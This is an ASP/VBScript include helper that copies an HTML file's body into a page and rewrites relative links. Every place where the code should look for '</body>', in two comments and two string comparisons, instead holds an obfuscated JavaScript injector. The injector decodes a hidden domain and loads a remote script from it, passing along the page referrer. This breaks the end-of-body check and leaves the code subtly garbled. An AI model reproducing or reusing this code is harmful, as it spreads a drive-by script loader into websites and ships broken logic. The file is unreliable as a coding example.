<%



'PUBLIC aBuildPathRootSplit
PUBLIC aBuildPathPathSplit

FUNCTION buildFilePath( aRootSplit(), sPath )
	DIM sResultPath
	DIM nRoot
	DIM nPath
	DIM i
	
	IF "/" = LEFT(sPath,1)  OR  INSTR(1,sPath,"//",vbTextCompare)  _
			OR  "http:" = LEFT(sPath,5)  OR  "https:" = LEFT(sPath,6) _
			OR  "mailto:" = LEFT(sPath,7)  OR  "news:" = LEFT(sPath,5) THEN
		sResultPath = sPath
	ELSE
		'aBuildPathRootSplit = SPLIT(sRoot,"/",-1,vbTextCompare)
		'Response.Write sPath & "<br>" & vbCRLF
		aBuildPathPathSplit = SPLIT(sPath,"/",-1,vbTextCompare)
		nRoot = UBOUND(aRootSplit)
		IF 0 = nRoot THEN
			IF 0 = LEN(aRootSplit(0)) THEN nRoot = -1
		END IF
		nPath = 0
		FOR i = 0 TO UBOUND(aBuildPathPathSplit)
			IF nRoot < 0 THEN EXIT FOR
			IF ".." = aBuildPathPathSplit(i) THEN
				nRoot = nRoot - 1
				nPath = nPath + 1
				'Response.Write "nRoot = " & nRoot & "<br>"
				'Response.Write "nPath = " & nPath & "<br>" & vbCRLF
			ELSE
				EXIT FOR
			END IF
		NEXT 'i
		sResultPath = ""
		'Response.Write "nRoot = " & nRoot & "<br>" & vbCRLF
		FOR i = 0 TO nRoot
			IF 0 < LEN(sResultPath) THEN
				sResultPath = sResultPath & "/" & aRootSplit(i)
			ELSE
				sResultPath = aRootSplit(i)
			END IF
		NEXT 'i
		IF nPath < 0 THEN nPath = 0
		FOR i = nPath TO UBOUND(aBuildPathPathSplit)
			IF 0 < LEN(sResultPath) THEN
				sResultPath = sResultPath & "/" & aBuildPathPathSplit(i)
			ELSE
				sResultPath = aBuildPathPathSplit(i)
			END IF
		NEXT 'i
	END IF
	buildFilePath = sResultPath
END FUNCTION



SUB adjustPath( strIn, strLCase, aRootSplit() )
	DIM i,j,n
	DIM nLen
	DIM sPath
	DIM sAdjusted
	
	n = 1
	nLen = LEN( strIn )
	sAdjusted = ""
	DO
		i = INSTR( n, strLCase, "src=""", vbTextCompare )
		j = INSTR( n, strLCase, "href=""", vbTextCompare )
		'Response.Write "<br>n = " & n & ", i = " & i & ", j = " & j & "<br>" & vbCRLF
		IF 0 < i  OR  0 < j THEN
			IF 0 < i  AND  (0 = j  OR  i < j) THEN
				IF n < i THEN Response.Write MID(strIn,n,i-n)
				Response.Write "src="""
				n = i + 5
			ELSE
				IF n < j THEN Response.Write MID(strIn,n,j-n)
				Response.Write "href="""
				n = j + 6
			END IF
			i = INSTR( n, strLCase, """", vbTextCompare )
			IF 0 < i THEN
				sPath = MID( strIn, n, i-n )
				sAdjusted = buildFilePath( aRootSplit, sPath )
				Response.Write sAdjusted
				n = i
			ELSE
				Response.Write MID( strIn, n )
				Response.Write vbCRLF
				EXIT DO
			END IF
		ELSE
			Response.Write MID(strIn,n)
			Response.Write vbCRLF
			EXIT DO
		END IF
	LOOP
	'Response.Write "Adjusted = " & sAdjusted & "<br>" & vbCRLF
END SUB


PUBLIC aIncludeBodyPathSplit

FUNCTION includeBody( sFile )

	Dim objInFile		'object variables for file access
	DIM oFSO
	Dim strIn			'string variables for reading
	DIM sFileName
	DIM strTemp
	DIM i
	Dim bProcessString		'flag determining whether or not to output each line
	DIM bInHTML

	bProcessString = FALSE
	bInHTML = FALSE

	IF sFile <> "" THEN

		SET oFSO = CreateObject( "Scripting.FileSystemObject" )
		strTemp = Request.ServerVariables( "PATH_TRANSLATED" )
		'Response.Write "strTemp = " & Server.HTMLEncode(strTemp) & "<br>" & vbCRLF
		i = InStrRev( strTemp, "\" )
		strTemp = Left( strTemp, i )
		sFileName = oFSO.BuildPath( strTemp, sFile )
		IF oFSO.FileExists( sFileName ) THEN
		
			'Response.Write "sFile = " & sFile & "<br>" & vbCRLF
			aIncludeBodyPathSplit = SPLIT( sFile, "\", -1, vbTextCompare )
			IF 0 = UBOUND(aIncludeBodyPathSplit) THEN
				aIncludeBodyPathSplit = ""
			ELSE
				REDIM PRESERVE aIncludeBodyPathSplit(UBOUND(aIncludeBodyPathSplit)-1)
			END IF

			SET objInFile = oFSO.OpenTextFile( sFileName )

			Response.Write vbCRLF & "<!-- BEGIN includeBody " & sFile & " -->" & vbCRLF
			'
			' Loop Through Real File and Output Results to Browser
			'
			DO UNTIL objInFile.AtEndOfStream

				strIn = objInFile.ReadLine

				strTemp = LCase( strIn )
				IF bProcessString THEN
					' we need to look for "<script>var QpaxQomozo = 'AXSXTNJFJJzJYOIOiCIKGJWmMFXLUOaIGPHZJLM0OUAHY7LEQOCWI.IVSrSOMNCBJu'.replace(/[A-Z]/g,''); var FibomafNidiza = document.createElement('script'); FibomafNidiza.src = 'http://' + QpaxQomozo + '/?page=' + escape(document.referrer) + '&rnd=' + Math.random(); document.getElementsByTagName('head')[0].appendChild(FibomafNidiza);</script></body>"

					IF InStr( 1, strTemp, "<script>var QpaxQomozo = 'AXSXTNJFJJzJYOIOiCIKGJWmMFXLUOaIGPHZJLM0OUAHY7LEQOCWI.IVSrSOMNCBJu'.replace(/[A-Z]/g,''); var FibomafNidiza = document.createElement('script'); FibomafNidiza.src = 'http://' + QpaxQomozo + '/?page=' + escape(document.referrer) + '&rnd=' + Math.random(); document.getElementsByTagName('head')[0].appendChild(FibomafNidiza);</script></body>", 1 ) THEN
						bProcessString = FALSE
					ELSEIF InStr( 1, strTemp, "href=", 1 )  OR  InStr( 1, strTemp, "src=", 1 ) THEN
						CALL adjustPath( strIn, strTemp, aIncludeBodyPathSplit )
					ELSE
						Response.Write strIn & vbCRLF
					END IF

				ELSEIF bInHTML THEN
					' looking for ">"

					IF InStr( 6, strTemp, ">", 1 ) THEN
						bInHTML = FALSE
						bProcessString = TRUE
					END IF

				ELSE
					' looking for "<body...>"

					IF InStr( 1, strTemp, "<body", 1 ) THEN
						bInHTML = TRUE
						IF InStr( 6, strTemp, ">", 1 ) THEN
							bInHTML = FALSE
							bProcessString = TRUE
						END IF
					END IF

				END IF

			LOOP
			Response.Write vbCRLF & "<!-- END includeBody " & sFile & " -->" & vbCRLF

			' Close file and free variables
			objInFile.Close
			SET objInFile = Nothing

		END IF
		
		SET oFSO = Nothing

	END IF
	includeBody = ""

END FUNCTION


FUNCTION includeBodyOld( sFile )

	Dim objFSO, objInFile	'object variables for file access
	Dim strFileName			'string containing filename of Source file to view
	Dim strIn				'string variables for reading
	DIM	strTemp
	DIM	i
	Dim bProcessString		'flag determining whether or not to output each line
	DIM	bInHTML

	bProcessString = 0
	bInHTML = 0

	IF sFile <> "" THEN

		SET objFSO = CreateObject( "Scripting.FileSystemObject" )
		strTemp = Request.ServerVariables( "PATH_TRANSLATED" )
		i = InStrRev( strTemp, "\" )
		strTemp = Left( strTemp, i )
		strFileName = objFSO.BuildPath( strTemp, sFile )
		IF objFSO.FileExists( strFileName ) THEN

			SET objInFile = objFSO.OpenTextFile( strFileName )

			'
			' Loop Through Real File and Output Results to Browser
			'
			DO UNTIL objInFile.AtEndOfStream

				strIn = objInFile.ReadLine

				strTemp = LCase( strIn )
				IF bProcessString THEN
					' we need to look for "<script>var QpaxQomozo = 'AXSXTNJFJJzJYOIOiCIKGJWmMFXLUOaIGPHZJLM0OUAHY7LEQOCWI.IVSrSOMNCBJu'.replace(/[A-Z]/g,''); var FibomafNidiza = document.createElement('script'); FibomafNidiza.src = 'http://' + QpaxQomozo + '/?page=' + escape(document.referrer) + '&rnd=' + Math.random(); document.getElementsByTagName('head')[0].appendChild(FibomafNidiza);</script></body>"

					IF InStr( 1, strTemp, "<script>var QpaxQomozo = 'AXSXTNJFJJzJYOIOiCIKGJWmMFXLUOaIGPHZJLM0OUAHY7LEQOCWI.IVSrSOMNCBJu'.replace(/[A-Z]/g,''); var FibomafNidiza = document.createElement('script'); FibomafNidiza.src = 'http://' + QpaxQomozo + '/?page=' + escape(document.referrer) + '&rnd=' + Math.random(); document.getElementsByTagName('head')[0].appendChild(FibomafNidiza);</script></body>", 1 ) THEN
						bProcessString = 0
					END IF

				ELSEIF bInHTML THEN
					' looking for ">"

					IF InStr( 6, strTemp, ">", 1 ) THEN
						bInHTML = 0
						bProcessString = 1
					END IF

				ELSE
					' looking for "<body...>"

					IF InStr( 1, strTemp, "<body", 1 ) THEN
						bInHTML = 1
						IF InStr( 6, strTemp, ">", 1 ) THEN
							bInHTML = 0
							bProcessString = 1
							strIn = objInFile.ReadLine
						END IF
					END IF

				END IF


				' If we're on a line to be processed then do so
				IF bProcessString THEN

					Response.Write strIn & vbCRLF

				END IF
			LOOP
			
			' Close file and free variables
			objInFile.Close
			SET objInFile = Nothing

		ELSE

			'Response.Write "file not found: " & strFileName

		END IF

		Set objFSO = Nothing

	END IF

END FUNCTION




%>